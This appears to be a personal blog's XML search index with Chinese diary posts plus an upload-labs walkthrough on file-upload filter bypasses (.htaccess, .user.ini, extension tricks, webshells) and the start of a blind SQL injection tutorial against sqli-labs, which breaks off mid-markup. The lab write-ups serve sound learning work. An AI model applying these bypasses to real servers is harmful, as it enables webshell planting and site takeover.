<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>恭喜edg</title>
    <link href="/2021/11/09/%E6%81%AD%E5%96%9Cedg/"/>
    <url>/2021/11/09/%E6%81%AD%E5%96%9Cedg/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>恭喜edg夺冠！（皇杂？真不熟😁），lpl好朋友可汗再次陪跑；meiko大满贯，成为当前lpl第一人；小学弟在edg呆了这么多年，从外援转成了本土，等他说获奖感言时，“为李哥报仇了，很开心”，唏嘘感慨，他为什么叫小学弟，因为他曾是李哥的替补啊…一代电竞人圆满梦，猪狗大战也早已落下帷幕…</p><p>我虽然不是厂长的粉，但想起Clearlove7，想起年年八强，肃然起敬。</p><p>有件意思的事，那个周末我和一好朋友开黑，他说玩最后几把LOL就不玩了。我问他那你要做什么，他说要做大人该做的事了（他的原话）。最后几把游戏他玩了盖伦，说这是第一个带给他快乐的英雄，玩了杰斯和青钢影，他玩的最多的两个英雄，他想这应该是完美谢幕了吧。那我想我就玩ez吧，主要和我一样帅，完美谢幕嘛。他把游戏卸了，我也是。<br>我还找得到第一次玩英雄联盟的那种感觉吗。时至今日仍记得，我第一个人头是用的死歌拿的，此后任何有关LOL的记忆，于此相比都黯淡不少。</p><p>有句话说得好，你无法同时拥有青春和对青春的感悟。现在几日过去了，残余着些许激动，又怅然若失。只庆幸我还有青春。</p><p>而为梦想拼搏的故事，怎么讲都精彩。</p><p>我现在睡觉都不把手机带上床了，冲。（还不是因为课上摆烂太久了…今年的破防周来的晚一些吧😫）</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lol</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload labs通关历程</title>
    <link href="/2021/10/27/upload%20labs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B/"/>
    <url>/2021/10/27/upload%20labs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p> upload-labs,一个专门用于训练文件上传漏洞的靶场。上传漏洞,就是攻击者可上传一个可执行文件,如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p><span id="more"></span><p>这篇文章记录我通关这个靶场的历程。</p><p><del>上次说记录通关历程的sqlilabs我好像就停在了20关🤔</del></p><hr><p>从第一关，开冲！</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027231935.png"></p><p>（简洁又美观的靶场）</p><p>很常见的界面，首先直接传入一个写入一句话木马的php文件试试。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027232317.png"></p><p>在点击上传后的一瞬间弹出了一个JavaScript的alter，告诉我们限制了文件的类型不能为php。这关的限制很有可能就在前端，上传时没有与服务器交互就以及拒绝了我。可以尝试把木马的php后缀改为jpg，上传jpg文件然后用burp抓包，修改数据再把包发出去。即将下图中的“a.jpg”改为“a.php”。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027232640.png"></p><p>接着用蚁剑连接即可。</p><p>另外值得注意的是上传后的文件路径可以在response中找到，这样蚁剑才能连接成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233052.png"></p><p>另外大致可以猜猜<strong>这关上传文件的限制代码并没有进行HTTP请求去访问服务器<br> 所以可判断这是前端js验证，验证代码在我们的浏览器上</strong></p><p>我们也可以直接禁用浏览器的JavaScript或删除部分相关的js代码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233354.png"></p><p>然后直接上传“a.php”，显示上传成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211027233447.png"></p><p>（这一关提示）</p><p>所以针对有前端限制的代码，可以用burp修改数据包绕过前端的限制，也可以直接通过浏览器禁用前端相关的限制代码。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>这关同样可以采取修改第一关的方法，上传后缀为jpg的木马文件，burp抓包后再修改回php，即可实现上传。</p><p>但不同的是这次不是通过前端JavaScript代码限制，而是在服务器端对数据包进行了MIME检测。</p><p><em>MIME是一种标准，用来表示文档、文件或字节流的性质和格式</em></p><p>不同类型的文件类型在传输时，有着不同的mime类型，这样浏览器就知道该用什么方式来打开它，和文件后缀的作用一致，只不过文件后缀是让操作系统知道这是什么类型文件，MIME是让信息的接收方知道这是什么类型的文件。</p><p>MIME在数据包中体现在了这一部分：content-type</p><p>如jpg类型的文件在content-type这一栏是image/jpeg</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028163015.png"></p><p>而php类型的文件在这一栏是application/octet-stream</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028162641.png"></p><p>所以除了刚才修改文件后缀的方法，我们也可以通过修改content-type这一属性来实现文件上传。直接上传php文件，然后再把数据包中content-type改为jpg的对应形式，即image/jpeg。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20211028181237168.png"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>这关在服务器端进行了黑名单限制。无论我们怎么修改数据包发过去，服务器都会在接收到文件后检查文件类型，如果匹配到了黑名单中的文件类型就会拒绝本次上传。</p><p>而黑名单最大的问题就是不全。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028183945.png"></p><p>我们可以把后缀改为php3或是phtml上传，上传成功。</p><p>但蚁剑却连接不了。</p><p>原来我的apache服务器的配置文件（httpd_conf）中没有将这类文件当作PHP类型文件来解析，所以解析不了。所以说这个漏洞属于是网站管理人员配置文件时的失误。真实环境中我们应该是没有机会能修改这个配置文件的🤔</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028204830.png"></p><p>将配置文件中这一栏修改为</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029204603.png">意思让服务器将php3类型的文件当作php类型来解析。</p><p>同时我注意到上传的文件名称变成了一串混乱的数字，因为源码对文件名进行了处理。</p><p>源码显示我们上传的文件路径变成了上传路径+一个结合时间的随机数+过滤后的后缀，也就是我们的文件名是拼接起来的，这个特性也是后面关卡中可以利用的点。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211104202602.png"></p><p>这个操作通常只是为了防止文件重名，不是为了防文件上传攻击（反正也保护不了），我们可以在上传页面右键复制来得到新的文件名。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029210228.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029204741.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029205119.png"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>这关看提示，过滤了很多的文件类型。<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028193733.png"></p><p>但是没有过滤掉<code>.htaccess</code></p><p><code>.htaccess</code>文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>我们就可以利用<code>.htaccess</code>文件的特性，上传一个具有目的性的<code>.htaccess</code>文件。（当服务器是apache时才有作用）创建一个txt文件，其内容如下，再将文件名改为.htaccess。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br></code></pre></div></td></tr></table></figure><p><strong>注意是文件名就为<code>.htaccess</code></strong></p><p>这个文件的意思是让服务器将所有的文件都当作php文件来解析。这样我们随便上传一个不在黑名单内的文件类型的木马，服务器都会接收并解析成php类型。</p><p>这样的话我们上传一个包含木马的且类型不在黑名单中的文件就行了。（图中只是为了验证上传的是包含phpinfo()函数的php文件）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030105921.png"></p><p>可以看出访问.png类型的文件时，服务器依然按照php文件解析，证明我们成功了。</p><p>另外上传<code>.htaccess</code>文件对这关配置文件<code>httpd_conf</code>文件也有要求，需要apache加载rewrite模块和允许重写。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030110424.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030110509.png"></p><p>除了上传.htaccess之外，还可以针对apache的解析机制绕过黑名单的检测。</p><p>Apache会将不认识的后缀，如muma.php.xxx.helloworld、test.php.iii等从右向左解析，不认识就往左移一个，最终移到php时apache认识了就会将该文件当作php文件来解析。</p><p>所以我们上传一个文件后缀为.php.xxxx的木马即可。当然这是在第4关没有针对这点做限制的前提下。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028210833.png"></p><p><strong>同时请注意</strong>：这需要前文中提到的配置文件<code>httpd_conf</code>中同样的地方<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028204830.png"></p><p><strong>将最前面的#号注释符删去才会生效</strong>，如下图</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029224135.png"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>这关告诉了我们上传目录中存在着一个php文件以及该文件的名字。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030140412.png"></p><p>我们可以上上传.user.ini文件，其内容如下</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file=info.jpg<br><span class="hljs-comment">//info.jpg是我们即将上传的包含php代码的文件</span><br></code></pre></div></td></tr></table></figure><p>从名字大概可以看出这个<code>.user.ini</code>文件是个用户自定义的配置文件，和上一关的<code>.htaccess</code>好像有些像。他们的特点可以参考下面这篇文章<a href="https://blog.csdn.net/since_2020/article/details/113781120?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">.htaccess文件和.user.ini文件_since_2020的博客-CSDN博客_user.ini是什么</a></p><p>简略来说，可以借助<code>.user.ini</code>轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是包含着php代码的非php文件。所以我们再上传一个<code>info.jpg</code>，再访问站点中的一个php文件时，服务器在执行这个PHP文件时会自动包含并执行我们所上传的文件。这关就提示了我们在上传目录中存在着<code>readme.php</code>。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030150849.png"></p><p>这样当我们访问某一个php文件时，自动执行了我们所上传的文件中的php代码。</p><p>另外值得注意的是，这种配置文件好像是有缓存的。当我第一次上传<code>.user.ini</code>文件后，这个<code>.user.ini</code>文件中的内容会管用很长一段时间，哪怕我在服务器端删除了这个<code>.user.ini</code>或上传一个新的<code>.user.ini.</code>都不会立刻生效，还是原来的<code>.user.ini</code>在起作用。</p><p>另外这一关我未能在低版本的环境中复现成功，也许是php或apache版本不对，也许是某个配置文件不对，总之换了一个环境才成功的。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030152156.png"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>通常文件上传的源码中会有很多限制文件后缀的函数，经过这些限制再结合黑名单检测，就可能阻止恶意文件（如PHP类型）上传。</p><p>为什么只用黑名单是不够的呢，就比如说黑名单中限制了后缀php，我们可以上传PHP，因为大小写不匹配，黑名单不会检测到，而服务器在解析的时候是不区分PHP大小写的，同样能够执行黑客上传的php代码。当然可以在黑名单中加上大写的PHP，显然这不现实，改成PHp黑名单同样检测不出来，所以通过函数来限制，对我们上传的文件后缀进行转换，再进行黑名单检测能大大增强防御力。</p><p>从第6关开始接下来几关都是源码文件中漏掉了一两个函数，在这几关中我们针对此来构造php后缀名进行绕过。</p><p>先来看看一个较为全面的函数限制：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210921.png"></p><p>上面的步骤进行了以下操作：去除文件前后的空格，去除文件末尾的<code>.</code>,从右往左截取第一个.后面的字符串（截取文件的后缀），并将其转化为小写，去除字符串<code>::$data</code>，去除文件后的空格。</p><p>直接来看这几个限制的函数可能会有点奇怪，通过下面几个关卡我们就知道如果没有这些限制的话，我们就能采取哪些方法绕过了。所以大部分文件上传点都会写很多限制函数。（光有这些限制也是不够的，在后面第10关有提到）</p><p>至于第6关</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106163644.png"></p><p>这关黑名单黑名单禁止的很全面，但忽略了大小写绕过，所以上传后缀为PHP的就行了。</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106164049.png"></p><p>因为没有去掉文件末尾的空格，这关可以采用添加空格绕过，上传后缀为<code>.php  </code>+一个空格即可，这样就匹配不到黑名单中的php了。</p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p>因为这里未用deldot函数 删除文件名末尾的点 ，也可以上传<code>xx.php.</code>文件。截取的后缀为空，匹配不到黑名单，而解析的时候利用了windows的特性，文件名最后的<code>.</code>会被忽略，所以<code>xx.php.</code>会被当作<code>xx.php</code>来解析如果是Linux的话就不会生效了。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106164737.png"></p><p>另外这关依旧存在apache的解析漏洞，之前提到的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210525.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210548.png"></p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106165058.png"></p><p>这关在文件名后面加上<code>::$data</code>,构成<code>xx.php::$data</code>即可。（蚁剑连接的时候删掉后面的::$data)</p><p>这同样是针对windos系统特性的方法。</p><p>如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，这项操作的目的就是使windows主机不检查后缀名。</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="C:\Users\26939\AppData\Roaming\Typora\typora-user-images\image-20211106165143482.png" alt="image-20211106165143482"></p><p>这关的限制函数可以说是最全面了，前面几关没有的函数它都有了，但我们同样针对源码构造构造<code>xx.php. .</code>绕过。</p><p>因为根据源码，首先创建一个变量等于文件名<code>xx.php. .</code>，然后去除末尾的点，变为<code>xx.php.空格</code>再创建一个变量等于其从右往左第一个点后面的值，即为<code>.空格</code>，转为小写，不变，去除<code>::$DATA</code>，不变，去除空格，变为了<code>.</code>，就是没有后缀了。这不会与黑名单中的<code>.xx</code>匹配，而服务器存储文件时，文件名为我们所构造的，经过一两步转化后的文件名，与第8关同样的原理，因windos的特性会被解析成php文件执行。</p><p><strong>值得注意的是，这第十关是最全面的限制了，那么如果我们用这个方法绕过了第10关，是不是意味着我们用同样的方法可以绕过其它关卡呢？</strong></p><p>当然是否定的的（属实想多了😶）其它关卡都可以成功上传<code>xx.php. .</code>，在匹配黑名单时其后缀被转化成了<code>.</code>，确实没匹配到黑名单，但都不能被解析成php文件执行。不是说根据windows特性都可以转化成php执行吗？这时我们到服务器里面一看，只有<code>xxx.</code>，后缀名都没有了。看来服务器储存的后缀直接变成了在黑名单检擦阶段经过转化后的后缀，这与第10关不同。</p><p><strong>看来服务器存储我们的文件时，其名字有可能是几样东西拼接而形成的，有的是拼接原文件名，有的是某个东西再拼接转化后的后缀，也就是说通常并不是我们上传的文件名是怎样，服务器储存的文件名就是怎样，这得看源码是怎样构造的。</strong>先来看看前一关源码。</p><p>这是第九关：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106173014.png"></p><p>这是第10关：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106173044.png"></p><p>区别就在$img_path，这也就是服务器储存的文件名。一个是上传路径+结合时间的随机数字+转化后的后缀，一个是上传路径+简单处理后文件名</p><p>也就是说对于后者，网站的防御者针对我们上传的文件后缀进行了一系列转化，只要我们的后缀通过了黑名单匹配，成功上传后，服务器中存储的文件名就是经过一两步简单的转化后的我们所原构造的文件名（要先删末尾的空格，再删去末尾的点）。我们构造的<code>xx.php. .</code>，在服务器端的就储存成了<code>xx.php.+空格 </code>，当然因为windos的特性，文件后面的空格和点都会被忽略变成了<code>xx.php</code>，即可被执行。</p><p><strong>而前者，我们所关心的后缀变成了转化后的<code>.</code>，所以拼接的时候是xxx+一个点，是没有后缀php的，当然解析不了。</strong></p><p>即当服务器储存的文件名是拼接我们上传的文件名时，我们可以利用<code>.</code>来绕过黑名单检测，因为黑名单检测的是后缀，如果在<code>.php</code>后我们再加上<code>.</code>，它所截取的后缀就不包括php字段了，而文件名末尾的点不影响解析成php文件；但是如果服务器储存的文件名包含经过转化后的后缀时，我们必须考虑通过黑名单检测后的后缀还能不能当作php文件来执行。如<code>.php.</code>,<code>php空格</code>等。（要我说就这一两种直接加在黑名单中不就防御完了吗🤔）</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106174416.png"></p><p>上面函数的意思是如果文件后缀中带有$deny_ext数组中的值的话就会被替换为空，构造<code>xx.pphphp. .</code>，双写绕过。</p><p>可以看出这一个限制函数的出发点与之前不同，前面的关卡都是先对你的文件后缀进行一些转化，然后进行黑名单匹配，如果匹配到了就拒绝上传，这里是先直接进行黑名单匹配，如果匹配到了就修改为空。</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>delete!</title>
    <link href="/2021/10/26/delete/"/>
    <url>/2021/10/26/delete/</url>
    
    <content type="html"><![CDATA[<p>昨天清理文件的时候看到这个笑死了🤣。</p><span id="more"></span><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211025170527.png"></p><p>（这个文件名是jxbrower）</p><p>这个博主说的很有道理。因为我也把这个文件删了，而且没事。</p><p>这个貌似是burp的缓存文件，博主90G而我只有30G，是不是顺便说明了我学web对比别人划2/3的水啊🤨</p><p>顺便推荐一个清理软件的神器，叫spacesniffer,能清楚形象的看出电脑硬盘的使用情况，软件大小还不到3M。</p><p>百度云链接：<a href="https://pan.baidu.com/s/19bpEigV2JePHJt3dexpHog">https://pan.baidu.com/s/19bpEigV2JePHJt3dexpHog</a><br>提取码：Eggs</p><p>效果图（运行过程是动态的，速度很快，界面也蛮酷炫的）：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211026222539.png"></p><p>这个双十一整个1t的机械硬盘，不想再折磨512的G的自带硬盘了..</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>。。。还得过挺快</title>
    <link href="/2021/10/20/%E4%B8%80%E5%90%8D%E6%87%92%E7%8B%97%E7%9A%84%E8%87%AA%E8%B4%A3/"/>
    <url>/2021/10/20/%E4%B8%80%E5%90%8D%E6%87%92%E7%8B%97%E7%9A%84%E8%87%AA%E8%B4%A3/</url>
    
    <content type="html"><![CDATA[<p>永远不要失去从头再来的勇气。</p><span id="more"></span><p>今朝有酒今朝醉是我，</p><p>三更灯火五更鸡也是我。</p><p>消极时是无垠宇宙浸入了我，浩瀚而虚无。</p><p>积极时是晚秋的凉风吹拂了我，寒冷而清醒。</p><p>为啥是晚秋，因为今天是2021年10月20日，刚看了下24节气，再过几天是霜降。努力不需要过多的修饰，就是脚踏实地好好吃饭。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1634742030776.jpeg"></p><p>—图源自电影《返老还童》</p><p>巧的是这也是我曾唯一给那个最喜欢的女孩子推荐过的电影。</p><p>这几天我也每晚呆在实验室（就目前那个“实验室”的作用就是一个自习室，叫实验室挺高端的），也熬夜玩手机到一点，期待RNG的世界赛取到好成绩（老皇杂了…这次世界赛可能是RNG和李哥的最后一年）在大学过了一年多了，也很是感谢我遇到的很多温柔且善良的人，我哥要结婚了希望他们能长长久久恩恩爱爱。。</p><p>这才叫碎碎念嘛，蛮对的起我起的分类名的。之前还担心有朋友会看，写的蛮拘束的。🤣实属多虑了。</p><p>我也不喜欢自怨自艾，但这么说出来一大推废话也轻松了许多，真正太负能量的还得靠自己强大，才能自己消化掉。</p><p>其实发这一篇主要就是想试试我还会发博客不，太久没发了。。</p><p>以后尽量常更新！记录自己的学习！</p><p>没事也可以发点废话检查一下自己的精神状态😁</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>艹！</title>
    <link href="/2021/07/26/%E8%89%B9/"/>
    <url>/2021/07/26/%E8%89%B9/</url>
    
    <content type="html"><![CDATA[<p>艹！怎么过了半个月了！</p><span id="more"></span><p>虽说早有预料到自己暑假恐怕又是无所事事混吃等死，可我这次，艹，势必不成功便成仁！</p><p>我写博客记录自己的学习经历，生活的趣事，是想用来督促我自己，让自己不要浪费生命，要活得精彩一些。</p><p>距离上次写技术文都好久了…长期一直在写的sqli labs的文章进度也保持稳定龟速…</p><p> 我也不喜欢写那些玩的事…玩是好玩，没必要写文章扯什么感悟折磨自己，而单纯的记录好傻哦，我怎么记嘛…不过玩的这几天，我也不后悔，以后还是得玩啊啊哈哈哈。</p><p>加油加油加油！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>冲冲冲!</title>
    <link href="/2021/07/09/%E5%86%B2%E5%86%B2%E5%86%B2/"/>
    <url>/2021/07/09/%E5%86%B2%E5%86%B2%E5%86%B2/</url>
    
    <content type="html"><![CDATA[<p>大一结束了。</p><span id="more"></span><p>最近发生了好多事。不过正经人谁写日记啊，不说了。</p><p>暑假冲冲冲！</p><p>不当懒狗！</p><p>建设祖国！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>用python编写一个sql注入脚本</title>
    <link href="/2021/06/16/py-script-sql-injection/"/>
    <url>/2021/06/16/py-script-sql-injection/</url>
    
    <content type="html"><![CDATA[<p>现在我已经会print（”hello world”）了，下面让我们来试一下用python写一个sql注入的脚本吧！</p><p>（针对sqli-labs8~10关）</p><span id="more"></span><p>不久前做到sqli-labs第八关盲注时，实在是受不了纯手注了。所以暂时搁置一段，先来学学怎么写个sql注入的自动化脚本。</p><p>虽然已经有sqlmap这种成熟的工具，但毕竟是别人的，功能再全面在某些地方也有局限。我认为与其去学怎么用别人工具还不如自己掌握技术，练练编写脚本的本事。</p><p><em>首先感谢这位老哥的博客，给了我很多帮助[<a href="https://uuzdaisuki.com/"> <strong>Leticia’s Blog</strong> </a>]</em></p><p><em>希望俺的博客以后也能帮到别人😊</em></p><hr><h3 id="能力要求："><a href="#能力要求：" class="headerlink" title="能力要求："></a>能力要求：</h3><ul><li><p>会 <code>print（“hello world”）</code>不会有人幼儿园没学过这个吧，不会吧不会吧</p><p>（开个玩笑，不过现在是真能卷，网上看到个小学生教数据库的，我好像大二才学数据库….）</p></li><li><p>能连上存在sql注入的靶场，我这里即sqli-labs</p><p>（我是在虚拟机环境搭建的靶场，主机运行的python环境。）</p></li></ul><h3 id="接下来要学到的："><a href="#接下来要学到的：" class="headerlink" title="接下来要学到的："></a>接下来要学到的：</h3><ul><li><strong>在盲注中使用的一系列命令</strong>（因为没有限制条件，用一两个完全足够了，但掌握多种函数可适应多种情况）</li><li><strong>python 中request库的使用，其实也就是要会写个简单的爬虫</strong></li></ul><hr><h4 id="sql盲注命令部分："><a href="#sql盲注命令部分：" class="headerlink" title="sql盲注命令部分："></a>sql盲注命令部分：</h4><p><em>以下关于命令的部分内容截取自</em></p><p><em><a href="https://www.w3school.com.cn/sql/sql_functions.asp">SQL 函数 (w3school.com.cn)</a></em></p><p><em><a href="https://my.oschina.net/zz006/blog/810112">sql中substr与substring函数用法 - 周大壮 - OSCHINA - 中文开源技术交流社区</a></em></p><ul><li><p>用来截取字符串的函数：</p><ul><li><strong><code>mid()</code></strong>    </li></ul><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">column_name</td><td align="left">必需。要提取字符的字段。</td></tr><tr><td align="center">start</td><td align="left">必需。规定开始位置（起始值是 1）。</td></tr><tr><td align="center">length</td><td align="left">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//返回数据库第一位</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//返回数据库名的第一位并与a的ascii作比较。</span><br></code></pre></div></td></tr></table></figure><ul><li><strong><code>substr()</code>和<code>substring()</code></strong></li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">substr(<span class="hljs-keyword">string</span>,<span class="hljs-built_in">start</span>,<span class="hljs-built_in">length</span>)<br>substr(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br></code></pre></div></td></tr></table></figure><p>string - 指定的要截取的字符串。<br>start - 必需，规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始<br>负数 - 在从字符串结尾的指定位置开始<br>0 - 在字符串中的第一个字符处开始<br>length - 指定要截取的字符串长度</p><p>可以看出用法同mid()类似</p><p>如：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//返回数据库的第二位，然后与a的ascii值比较<br>substr((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-type">text</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//查找test数据库的第一个表名并提取表名的第一位,然后与a的ascii值作比较。<br></code></pre></div></td></tr></table></figure><ul><li><p><code>left()</code></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(string,n)</span></span><br></code></pre></div></td></tr></table></figure><p>string ： 必要参数，要截取的字符串。</p><p>n : 必要参数，规定截取的长度，从1开始。</p><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//查看数据库名的第一位并和a的ascii作比较</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>用来针对基于时间的盲注的函数：</p><ul><li><p><code>sleep()</code></p><figure 